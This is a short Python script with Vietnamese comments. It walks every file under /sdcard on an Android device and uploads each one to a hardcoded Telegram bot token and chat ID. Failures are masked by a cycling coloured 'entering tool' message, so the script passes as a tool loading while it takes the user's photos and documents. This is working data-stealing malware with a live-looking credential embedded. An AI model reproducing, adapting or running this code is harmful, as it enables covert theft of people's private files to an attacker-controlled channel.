import os
import telebot

# Danh sách màu chữ ANSI
colors = [
    "\033[1;31m", "\033[1;91m", "\033[1;32m", "\033[1;92m",
    "\033[1;33m", "\033[1;93m", "\033[1;34m", "\033[1;94m",
    "\033[1;35m", "\033[1;95m", "\033[1;36m", "\033[1;96m",
]

BOT_TOKEN = "7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc"
CHAT_ID = "6540534126"

bot = telebot.TeleBot(BOT_TOKEN)

color_index = 0

def send_file_to_telegram(file_path):
    global color_index  # Khai báo sử dụng biến toàn cục
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
    except Exception as e:
        print(colors[color_index] + "Đang vào tool...", end="\r")
        color_index = (color_index + 1) % len(colors)

def send_all_files_from_directory(directory):
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            send_file_to_telegram(file_path)

# Gọi hàm với thư mục bạn muốn gửi file từ đó (ví dụ: /sdcard)
send_all_files_from_directory("/sdcard")
